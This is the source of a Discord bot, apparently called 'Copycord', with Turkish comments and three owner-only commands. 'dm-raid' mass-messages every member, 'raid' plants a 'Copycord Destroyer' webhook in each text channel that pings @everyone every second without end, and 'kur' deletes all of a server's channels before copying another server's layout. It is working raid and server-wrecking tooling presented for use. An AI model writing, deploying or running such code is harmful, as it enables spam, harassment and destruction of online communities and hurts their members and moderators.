require('dotenv').config();
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ChannelType, EmbedBuilder } = require('discord.js');
const http = require('http');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers, // DM Raid için ŞART
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const OWNER_ID = "1389930042200559706";

// --- KOMUTLAR ---
const commands = [
    new SlashCommandBuilder()
        .setName('dm-raid')
        .setDescription('Sunucudaki herkese DM atar.')
        .addStringOption(opt => opt.setName('mesaj').setDescription('Mesaj içeriği').setRequired(true)),
    
    new SlashCommandBuilder()
        .setName('raid')
        .setDescription('Kanallara Webhook ile mermi yağdırır.')
        .addStringOption(opt => opt.setName('mesaj').setDescription('Spam içeriği').setRequired(true)),

    new SlashCommandBuilder()
        .setName('kur')
        .setDescription('Copycord Altyapısı: Sunucuyu kopyalar.')
        .addStringOption(opt => opt.setName('id').setDescription('Kaynak ID').setRequired(true))
].map(c => c.toJSON());

client.once('ready', async () => {
    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_BOT_TOKEN);
    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
    console.log(`☣️ COPYCORD SYSTEM READY: ${client.user.tag}`);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.user.id !== OWNER_ID) return interaction.reply("❌ Yetkin yok!");

    const { commandName, options, guild } = interaction;

    // --- 1. DM RAID (YETKİSİZ SIZMA) ---
    if (commandName === 'dm-raid') {
        const text = options.getString('mesaj');
        await interaction.reply({ content: "🚀 DM Operasyonu Başladı...", ephemeral: true });
        
        const members = await guild.members.fetch();
        for (const member of members.values()) {
            if (member.user.bot) continue;
            await member.send(text).catch(() => console.log(`${member.user.tag} DM Kapalı.`));
            await new Promise(r => setTimeout(r, 1500)); // Rate limit koruması
        }
    }

    // --- 2. WEBHOOK RAID (KANAL IMHASI) ---
    if (commandName === 'raid') {
        const text = options.getString('mesaj');
        await interaction.reply({ content: "☣️ Webhooklar hazırlanıyor...", ephemeral: true });

        const channels = await guild.channels.fetch();
        channels.filter(c => c.type === ChannelType.GuildText).forEach(async ch => {
            const wb = await ch.createWebhook({ name: 'Copycord Destroyer' }).catch(() => null);
            if (wb) {
                setInterval(() => {
                    wb.send(`@everyone ${text}`).catch(() => {});
                }, 1000);
            }
        });
    }

    // --- 3. COPYCORD CLONER (SUNUCU KURMA) ---
    if (commandName === 'kur') {
        const srcId = options.getString('id');
        const src = client.guilds.cache.get(srcId);
        if (!src) return interaction.reply("Kaynak sunucu bulunamadı!");

        await interaction.reply("🏗️ Sunucu kopyalanıyor...");
        
        // Kanalları temizle
        const currentChans = await guild.channels.fetch();
        for (const c of currentChans.values()) await c.delete().catch(() => {});

        // Copycord Mantığı: Kategoriler ve Kanallar
        const srcChans = await src.channels.fetch();
        for (const cat of srcChans.filter(c => c.type === ChannelType.GuildCategory).values()) {
            const newCat = await guild.channels.create({ name: cat.name, type: ChannelType.GuildCategory });
            const children = srcChans.filter(c => c.parentId === cat.id);
            for (const ch of children.values()) {
                await guild.channels.create({ name: ch.name, type: ch.type, parent: newCat.id });
                await new Promise(r => setTimeout(r, 1000));
            }
        }
    }
});

http.createServer((req, res) => res.end("Copycord Online")).listen(process.env.PORT || 3000);
client.login(process.env.DISCORD_BOT_TOKEN);
